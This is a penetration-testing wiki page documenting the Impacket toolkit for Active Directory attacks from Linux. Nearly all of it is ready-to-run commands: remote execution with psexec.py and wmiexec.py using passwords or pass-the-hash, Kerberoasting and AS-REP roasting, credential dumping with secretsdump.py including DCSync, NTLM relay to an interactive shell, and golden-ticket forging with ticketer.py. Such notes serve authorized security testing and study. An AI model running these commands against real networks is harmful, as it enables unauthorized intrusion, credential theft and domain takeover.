---
title: Impacket
permalink: /wiki/offsec-notes/entities/impacket/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
---

**Type:** Tool / Library
**Also known as:** Impacket suite
**Related:** [Active Directory Attacks](/wiki/offsec-notes/concepts/active-directory-attacks/), [Kerberoasting](/wiki/offsec-notes/concepts/kerberoasting/), [Pass The Hash](/wiki/offsec-notes/concepts/pass-the-hash/), [Lateral Movement](/wiki/offsec-notes/concepts/lateral-movement/)

## Description
Impacket is a collection of Python classes for working with network protocols, and a suite of standalone tools built on those classes. It is the primary toolkit for AD/Windows attacks from Linux. Maintained by Fortra (formerly Core Security); extremely well-maintained and widely used in offensive security.

## Usage / Details

### Installation
```bash
pip3 install impacket
# Or from source:
git clone https://github.com/fortra/impacket && cd impacket && pip3 install .

# Kali: apt install python3-impacket impacket-scripts
```

### Authentication Syntax
All tools use similar syntax for auth:
- Password: `domain/user:password@target`
- Hash (PtH): `domain/user@target -hashes :NTLMhash`
- Kerberos ticket: `domain/user@target -k -no-pass`

### Key Tools

#### Lateral Movement / Remote Execution
```bash
# PsExec-style (creates service — noisy)
psexec.py domain/user:pass@target

# WMI (quieter, no service)
wmiexec.py domain/user:pass@target 'cmd.exe /c whoami'
wmiexec.py -hashes :NTLMhash domain/user@target

# SMBExec (no binary upload)
smbexec.py domain/user:pass@target

# DCOM exec
dcomexec.py domain/user:pass@target 'cmd.exe /c whoami'

# atexec (scheduled task)
atexec.py domain/user:pass@target 'whoami'
```

#### Kerberos Attacks
```bash
# Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile krb.txt

# AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1

# Request TGT
getTGT.py domain.local/user:pass -dc-ip 10.10.10.1
# Sets KRB5CCNAME env var; use with -k flag
```

#### Credential Dumping
```bash
# DCSync (requires DS-Replication rights — usually DA/DCSync ACE)
secretsdump.py domain/user:pass@dc01.domain.local
secretsdump.py -hashes :NTLMhash domain/user@dc01

# Dump SAM/SYSTEM/SECURITY remotely
secretsdump.py domain/admin:pass@target

# Dump from local registry hive files
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

#### SMB Enumeration
```bash
# List shares
smbclient.py domain/user:pass@target

# Mount share
smbclient.py //target/share -U domain/user%password

# CrackMapExec wrapper (uses impacket under hood)
# But direct smbclient.py for manual work
```

#### Relay Attacks (NTLM Relay)
```bash
# ntlmrelayx: relay NTLM auth to another target
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -i   # Interactive shell
ntlmrelayx.py -t ldaps://dc01 --delegate-access  # RBCD attack via LDAP
```

#### Ticket Manipulation
```bash
# Export TGS to ccache
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
# Creates administrator.ccache → KRB5CCNAME=administrator.ccache python3 wmiexec.py -k
```

## References
- Impacket GitHub — github.com/fortra/impacket
- Impacket examples — github.com/fortra/impacket/tree/master/examples
